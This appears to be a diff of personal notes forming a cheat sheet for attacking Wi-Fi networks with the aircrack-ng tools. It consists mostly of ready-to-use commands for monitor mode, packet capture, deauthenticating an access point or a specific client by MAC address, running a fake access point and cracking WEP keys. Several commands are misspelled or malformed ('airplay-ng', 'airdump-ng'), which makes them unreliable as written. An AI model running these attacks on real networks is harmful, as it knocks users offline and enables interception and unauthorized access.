@@ -1,3 +1,13 @@
+[Modes]
+
+Wireless cards coud be in several modes:
+	- Managed
+	- Monitor
+
+[Type of Attacks]
+- Deauthentication     :: Used to disconnect any device from the Ap. 
+	- airplay-ng --deauth [# of packets] -a [AP] [interface]
+
 [Anonimity]
 
 - macchanger
@@ -6,13 +16,65 @@
 
 [Configure NIC into Monitor Mode]
 
-- ifconfig wlan0 down
-- iwconfig wlan0 mod monitor- ifconfig wlan0 up
-- airmon-ng check wlan0
+- iwconfig [interface]
+- ifconfig [interface] down          
+- airmon-ng check [interface]
+- airmon-ng start [interface]    :: Enable monitor mode
+- airmon-ng stop [interface]    :: Disable monitor mode
+- iwconfig wlan0 mod monitor - ifconfig [interface] up
+
+[Monitoring Wireless Networks]
+
+[Airdump-ng]
+
+- airodump-ng [interface]
+- airdump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
+- airdump-ng --channel 6 --bssid 11:22:33:44:55:66 --write out mon0 
+- airdump-ng --write [filename] --output-format csv [interface]
+
+[airdump-ng fields]
+
+BSSID       :: Mac Address's Victim Access Point (AP) 
+PWR			:: Strenght of the signal
+BEACONS     ::
+#DATA       ::
+#/s         ::
+CH          ::
+MB          :: Max speed supported by the AP.
+ENC         :: Encription used by the AP.  	      :: WEP, WPA, WPA2
+Cipher      :: Cipher used to encrypt the packet  :: WEB, CCMP, TKIP
+Auth        :: Type of authentication             :: PSK, MGT
+ESSID
+
+Station     :: Client connected to the AP.
+Rate        ::
+Lost
+Frames
+Probe
+
+[airdrop]
+
+- airdrop-ng -t [csv-file] -r [rules-file] -i [interface]
+- airdrop-ng -t file.csv -r airdrop-rules.txt -i mon0
+
+[Deauthentication]
+
+- airplay-ng --deauth [Number of packets] -a [AP] [interface]
+- airplay-ng --deauth 1000 -a 11:22:33:44:55:66 mon0
+
+:: Deauthenticate an specific client ::
+
+- airplay-ng --deauth [Number of packets] -a [AP] -c [target] [interface]
+- airplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c AA:BB:CC:DD:EE:FF mon0
+
+[Fake AP]
+
+- airbase-ng -e [network-name] -c [channel] [interface] 
+- airbase-ng -e fake-ap -c 3 mon0
 
 [WEP]
 
-airodump-ng wlan0mon
+airodump-ng [interface]
 airodump-ng -c[CHANNEL] -w[FILE] --bssid[BSSID] wlan0mon
 aireplay-ng -0 4 -a [MAC] wlan0mon
 aircrack-ng -w[wordlist] file.cap
@@ -54,8 +116,6 @@ BSSID   PWR   BEACONS  #DATA   #/s    CH   MB   ENC  CIPHER  AUTH  ESSID
 - ,:
 
 
-
-
 [WEP]
 
 - airmon-ng start wlan0
@@ -74,6 +134,10 @@ BSSID   PWR   BEACONS  #DATA   #/s    CH   MB   ENC  CIPHER  AUTH  ESSID
 - aireplay-ng --deauth[number of deauth packets] -a [AP] -c [target][interface]
 	- aireplay-ng --deauth 4 -a 60:E7:01:07:12:E0 -c EC:1F:72:4C:9B:B4 mon0
 
+
+[LORCON]
+
+lorcon (acronym for Loss Of Radio CONnectivity) is an open source network tool. It is a library for injecting 802.11 (WLAN) frames, capable of injecting via multiple driver frameworks, without the need to change the application code. Lorcon is built by patching the third-party MadWifi-driver for cards based on the Qualcomm Atheros wireless chipset.[1][2][3]
 
 :: Links ::
 
